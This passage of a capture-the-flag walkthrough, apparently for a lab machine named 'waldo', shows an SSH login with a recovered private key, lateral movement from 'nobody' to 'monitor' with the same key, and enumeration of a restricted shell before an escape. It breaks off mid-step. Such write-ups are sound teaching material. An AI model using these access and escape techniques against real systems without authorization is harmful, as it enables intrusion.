    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">chmod </span>400 .monitor
</code></pre></div>    </div>
  </li>
  <li>Login via <strong><code class="highlighter-rouge">ssh</code></strong> using the private key as the user, <strong><code class="highlighter-rouge">nobody</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> .monitor <span class="nt">-l</span> nobody 10.10.10.87
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span> 
<span class="go">   
  uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">
  3276........................9d24
  
</span></code></pre></div>    </div>
  </li>
</ul>

<hr />

<h2 id="part-5--lateral-movement-nobody---monitor">PART 5 : LATERAL MOVEMENT (nobody -&gt; monitor)</h2>

<ul>
  <li>Re-examine the <strong><code class="highlighter-rouge">~/.ssh</code></strong> directory:
    <ul>
      <li><strong><code class="highlighter-rouge">authorized_keys</code></strong>:
        <pre><code class="language-rsa">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgk
fqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlR
tJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbB
VeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+a
rOD6NJOFJY4jBHvf monitor@waldo
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The private key from earlier seems to have been created for a user, <strong><code class="highlighter-rouge">monitor</code></strong>.
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Connect to <strong><code class="highlighter-rouge">monitor@waldo</code></strong> via ssh using the <strong><code class="highlighter-rouge">nobody</code></strong> terminal:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/.ssh/.monitor monitor@waldo <span class="nt">-t</span> sh
<span class="go">
</span><span class="gp">$</span><span class="w"> </span><span class="nb">id</span> 
<span class="go">  
  uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)

</span></code></pre></div>    </div>
  </li>
</ul>

<hr />

<h2 id="part-6--privilege-escalation-monitor---root">PART 6 : PRIVILEGE ESCALATION (monitor -&gt; root)</h2>

<ul>
  <li>Enumerate the system:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="nv">$PATH</span>
<span class="go">    
  /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1

</span><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> ~/bin
<span class="go">  
</span><span class="gp">  lrwxrwxrwx 1 root root  7 May  3  2018 ls -&gt;</span><span class="w"> </span>/bin/ls
<span class="gp">  lrwxrwxrwx 1 root root 13 May  3  2018 most -&gt;</span><span class="w"> </span>/usr/bin/most
<span class="gp">  lrwxrwxrwx 1 root root  7 May  3  2018 red -&gt;</span><span class="w"> </span>/bin/ed
<span class="gp">  lrwxrwxrwx 1 root root  9 May  3  2018 rnano -&gt;</span><span class="w"> </span>/bin/nano
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>getcap ~/bin/<span class="k">*</span>
<span class="go">
  bash: getcap: command not found

</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The only binaries to could be executed are the ones inside <strong><code class="highlighter-rouge">monitor</code></strong>‚Äôs home directory.</li>
      <li>The binaries are <strong><em>symlinked</em></strong> to the usual directories like <strong><code class="highlighter-rouge">/usr/bin/</code></strong> and <strong><code class="highlighter-rouge">/bin</code></strong>.</li>
      <li>The environment variable, <strong><code class="highlighter-rouge">PATH</code></strong>, enables binaries to be executed without calling their <strong>absolute paths</strong>.</li>
      <li>The limitation could be overcome by actually calling a binary‚Äôs absolute path or by exporting the other directories to the environment variable, <strong><code class="highlighter-rouge">PATH</code></strong>.
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Export the other paths to <strong><code class="highlighter-rouge">$PATH</code></strong>:</li>
</ul>

:ET